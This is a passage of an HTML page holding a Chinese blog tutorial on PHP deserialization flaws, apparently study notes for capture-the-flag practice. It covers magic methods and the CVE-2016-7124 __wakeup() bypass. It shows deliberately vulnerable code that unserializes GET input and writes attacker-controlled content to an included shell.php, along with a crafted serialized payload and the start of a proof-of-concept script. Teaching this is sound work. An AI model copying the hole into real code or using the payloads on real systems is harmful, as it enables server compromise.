@@ -1,0 +1,888 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>PHP反序列化 - Ting BLOG🐈</title><meta name="author" content="Ting">
+<meta name="description" content="PHP反序列化漏洞漏洞产生原理反序列化的参数用户可控，服务器接收我们序列化后的字符串并且未经过过滤把其中的变量放入一些魔术方法内执行，容易产生漏洞。
+"><meta name="keywords" content='Web, PHP漏洞'>
+  <meta itemprop="name" content="PHP反序列化">
+  <meta itemprop="description" content="PHP反序列化漏洞漏洞产生原理反序列化的参数用户可控，服务器接收我们序列化后的字符串并且未经过过滤把其中的变量放入一些魔术方法内执行，容易产生漏洞。">
+  <meta itemprop="datePublished" content="2024-10-30T11:25:40+08:00">
+  <meta itemprop="dateModified" content="2024-10-30T11:25:40+08:00">
+  <meta itemprop="wordCount" content="576">
+  <meta itemprop="keywords" content="Web,PHP漏洞"><meta property="og:url" content="https://Tin10g.github.io/posts/2024web-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+  <meta property="og:site_name" content="Ting BLOG🐈">
+  <meta property="og:title" content="PHP反序列化">
+  <meta property="og:description" content="PHP反序列化漏洞漏洞产生原理反序列化的参数用户可控，服务器接收我们序列化后的字符串并且未经过过滤把其中的变量放入一些魔术方法内执行，容易产生漏洞。">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-10-30T11:25:40+08:00">
+    <meta property="article:modified_time" content="2024-10-30T11:25:40+08:00">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="PHP漏洞">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="PHP反序列化">
+  <meta name="twitter:description" content="PHP反序列化漏洞漏洞产生原理反序列化的参数用户可控，服务器接收我们序列化后的字符串并且未经过过滤把其中的变量放入一些魔术方法内执行，容易产生漏洞。">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://img.picui.cn/free/2024/10/25/671b813cb6b0a.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://Tin10g.github.io/posts/2024web-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化 - Ting BLOG🐈" /><link rel="prev" type="text/html" href="https://Tin10g.github.io/posts/2024web-cve-2021-29454smarty%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="Smarty模板注入" /><link rel="next" type="text/html" href="https://Tin10g.github.io/posts/2024web-misc/" title="Misc" /><link rel="alternate" type="text/markdown" href="https://Tin10g.github.io/posts/2024web-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.md" title="PHP反序列化 - Ting BLOG🐈"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "PHP反序列化",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/Tin10g.github.io\/posts\/2024web-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/"
+    },"genre": "posts","keywords": "Web, PHP漏洞","wordcount":  576 ,
+    "url": "https:\/\/Tin10g.github.io\/posts\/2024web-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/","datePublished": "2024-10-30T11:25:40+08:00","dateModified": "2024-10-30T11:25:40+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Ting"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Ting BLOG🐈"><span class="header-title-pre">🐈</span><span class="typeit"><template>Ting BLOG</template></span></a><span class="typeit header-subtitle"><template></template></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/archives/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                
+                
+              ><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Ting BLOG🐈"><span class="header-title-pre">🐈</span><span class="typeit"><template>Ting BLOG</template></span></a><span class="typeit header-subtitle"><template></template></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/archives/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  
+                  
+                ><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>PHP反序列化</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="Tin10g.github.io" title="Author" rel=" author" class="author"><img loading="lazy" src="https://img.picui.cn/free/2024/10/25/671b813cb6b0a.png" alt="Ting" data-title="Ting" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Ting</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/web--2024%E7%AC%94%E8%AE%B0/" class="post-category" title="Category - Web · 2024笔记"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Web · 2024笔记</a></span></div><div class="post-meta-line"><span title="published on 2024-10-30 11:25:40"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-10-30">2024-10-30</time></span>&nbsp;<span title="576 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 600 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞产生原理">漏洞产生原理</a></li>
+    <li><a href="#常见魔术方法">常见魔术方法</a></li>
+    <li><a href="#漏洞实例">漏洞实例</a>
+      <ul>
+        <li><a href="#wakeup绕过">wakeup()绕过</a>
+          <ul>
+            <li><a href="#修改变量数出发漏洞">修改变量数出发漏洞</a></li>
+            <li><a href="#通过变量数值修改属性个数">通过变量数值修改属性个数</a></li>
+            <li><a href="#变量引用">变量引用</a></li>
+            <li><a href="#直接去掉最后一个括号">直接去掉最后一个括号</a></li>
+          </ul>
+        </li>
+        <li><a href="#php反序列化字符逃逸">PHP反序列化字符逃逸</a>
+          <ul>
+            <li><a href="#逃逸原理">逃逸原理</a></li>
+            <li><a href="#过滤后字符变多">过滤后字符变多</a>
+              <ul>
+                <li><a href="#关键函数">关键函数</a></li>
+                <li><a href="#目的">目的</a></li>
+                <li><a href="#逃逸方法">逃逸方法</a></li>
+              </ul>
+            </li>
+            <li><a href="#过滤后字符变少">过滤后字符变少</a>
+              <ul>
+                <li><a href="#逃逸方法-1">逃逸方法</a></li>
+              </ul>
+            </li>
+            <li><a href="#字符串逃逸综述">字符串逃逸综述</a></li>
+          </ul>
+        </li>
+        <li><a href="#phar反序列化">phar反序列化</a>
+          <ul>
+            <li><a href="#利用条件">利用条件</a></li>
+            <li><a href="#影响函数">影响函数</a></li>
+            <li><a href="#构造phar文件">构造phar文件</a></li>
+            <li><a href="#绕过方法">绕过方法</a></li>
+            <li><a href="#session反序列化">session反序列化</a>
+              <ul>
+                <li><a href="#漏洞原理">漏洞原理</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="php反序列化漏洞" class="heading-element"><span>PHP反序列化漏洞</span>
+  <a href="#php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h2 id="漏洞产生原理" class="heading-element"><span>漏洞产生原理</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e4%ba%a7%e7%94%9f%e5%8e%9f%e7%90%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>反序列化的参数用户可控，服务器接收我们序列化后的字符串并且未经过过滤把其中的变量放入一些魔术方法内执行，容易产生漏洞。</p>
+<h2 id="常见魔术方法" class="heading-element"><span>常见魔术方法</span>
+  <a href="#%e5%b8%b8%e8%a7%81%e9%ad%94%e6%9c%af%e6%96%b9%e6%b3%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><code>__invoke()</code>:当尝试以调用函数的方式调用对象的时候，就会调用该方法</p>
+<p><code>__construst()</code>:具有构造函数的类在创建新对象的时候，回调此方法</p>
+<p><code>__destruct()</code>:反序列化的时候，或者对象销毁的时候调用</p>
+<p><code>__wakeup()</code>:反序列化的时候调用</p>
+<p><code>__sleep()</code>:序列化的时候调用</p>
+<p><code>__toString()</code>:把类当成字符串的时候调用，一般在echo处生效</p>
+<p><code>__set()</code>:在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</p>
+<p><code>__get()</code>:读取不可访问或者不存在的属性的时候，进行赋值</p>
+<p><code>__call()</code>:在对象中调用一个不可访问的方法的时候，会被执行</p>
+<h2 id="漏洞实例" class="heading-element"><span>漏洞实例</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%ae%9e%e4%be%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="wakeup绕过" class="heading-element"><span>wakeup()绕过</span>
+  <a href="#wakeup%e7%bb%95%e8%bf%87" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="修改变量数出发漏洞" class="heading-element"><span>修改变量数出发漏洞</span>
+  <a href="#%e4%bf%ae%e6%94%b9%e5%8f%98%e9%87%8f%e6%95%b0%e5%87%ba%e5%8f%91%e6%bc%8f%e6%b4%9e" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><blockquote>
+<p>CVE-2016-7124</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">A</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">var</span> <span class="o">$</span><span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;test&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">function</span> <span class="n">__wakeup</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;wakeup!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">function</span> <span class="n">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s2">&#34;C:</span><span class="se">\\</span><span class="s2">phpstudy_pro</span><span class="se">\\</span><span class="s2">WWW</span><span class="se">\\</span><span class="s2">unserialize</span><span class="se">\\</span><span class="s2">shell.php&#34;</span><span class="p">,</span><span class="s2">&#34;w&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fputs</span><span class="p">(</span><span class="o">$</span><span class="n">fp</span><span class="p">,</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">target</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fclose</span><span class="p">(</span><span class="o">$</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">test</span> <span class="o">=</span> <span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;test&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">test_unseria</span> <span class="o">=</span> <span class="n">unserialize</span><span class="p">(</span><span class="o">$</span><span class="n">test</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">echo</span> <span class="s2">&#34;shell.php&lt;br/&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">include</span><span class="p">(</span><span class="s2">&#34;.\shell.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>代码正常的执行逻辑:</p>
+<ul>
+<li>
+<p>unserialize( )会检查是否存在一个_wakeup( )方法。_</p>
+</li>
+<li>
+<p>本例中存在，则会先调用_wakeup()方法，预先将对象中的target属性赋值为&quot;wakeup!&quot;。</p>
+<div class="alert alert-note"><p class="alert-title"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/></svg>Note</p><p><p>不管用户传入的序列化字符串中的target属性为何值，<strong>wakeup()都会把$target的值重置为&quot;wakeup!&quot;</strong></p>
+</div></li>
+<li>
+<p>由于我们需要修改值，所以就需要绕过wakeup()进行我们的反序列化。</p>
+</li>
+</ul>
+<p>这个可以通过修改序列化之后那串内容具体有几个参数来绕过</p>
+<p>例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:1:&#34;X&#34;:1:{s:1:&#34;x&#34;;s:13:&#34;fllllllag.php&#34;;}	# 原
+</span></span><span class="line"><span class="cl">O:1:&#34;X&#34;:2:{s:1:&#34;x&#34;;s:13:&#34;fllllllag.php&#34;;}	# 改</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="通过变量数值修改属性个数" class="heading-element"><span>通过变量数值修改属性个数</span>
+  <a href="#%e9%80%9a%e8%bf%87%e5%8f%98%e9%87%8f%e6%95%b0%e5%80%bc%e4%bf%ae%e6%94%b9%e5%b1%9e%e6%80%a7%e4%b8%aa%e6%95%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><h4 id="变量引用" class="heading-element"><span>变量引用</span>
+  <a href="#%e5%8f%98%e9%87%8f%e5%bc%95%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p><strong>poc</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="n">show_source</span><span class="p">(</span><span class="n">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">###very___so___easy!!!!</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">test</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="o">$</span><span class="n">a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="o">$</span><span class="n">b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="o">$</span><span class="n">c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">a</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">b</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">c</span><span class="o">=</span><span class="mi">3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__wakeup</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">a</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">function</span> <span class="n">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">b</span><span class="o">=$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">c</span><span class="p">;</span>
